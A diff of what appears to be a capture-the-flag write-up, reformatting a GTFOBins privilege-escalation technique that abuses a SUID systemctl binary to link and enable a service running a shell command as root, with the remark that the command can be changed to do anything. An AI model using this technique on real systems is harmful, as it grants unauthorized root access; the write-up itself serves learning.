@@ -149,14 +149,21 @@ Looking for `systemctl` exploits on [GTFOBins][2], we find one that takes advant
 
 The first line can be omitted as we are interacting with a binary that already has `SUID` set and change the path to `/bin/systemctl`
 
-`TF=$(mktemp).service
-echo '[Service]
-Type=oneshot
-ExecStart=/bin/sh -c "id > /tmp/output"
-[Install]
-WantedBy=multi-user.target' > $TF
-/bin/systemctl link $TF
-/bin/systemctl enable --now $TF`
+`TF=$(mktemp).service`
+
+`echo '[Service]`
+
+`Type=oneshot`
+
+`ExecStart=/bin/sh -c "id > /tmp/output"`
+
+`[Install]`
+
+`WantedBy=multi-user.target' > $TF`
+
+`/bin/systemctl link $TF`
+
+`/bin/systemctl enable --now $TF`
 
 Paste this code into the shell.
 
@@ -164,7 +171,7 @@ This exploit opens a shell, executes the `id` command and outputs it to `/tmp/ou
 
 ![id](images/id.png)
 
-We see that output of the `id` command shows we are root so we can change the `id` command to do anything!
+We see that output of the `id` command shows we are `root` so we can change the `id` command to do anything!
 
 Checking the `/` directory shows a `root` folder only accessible to `root` 
 
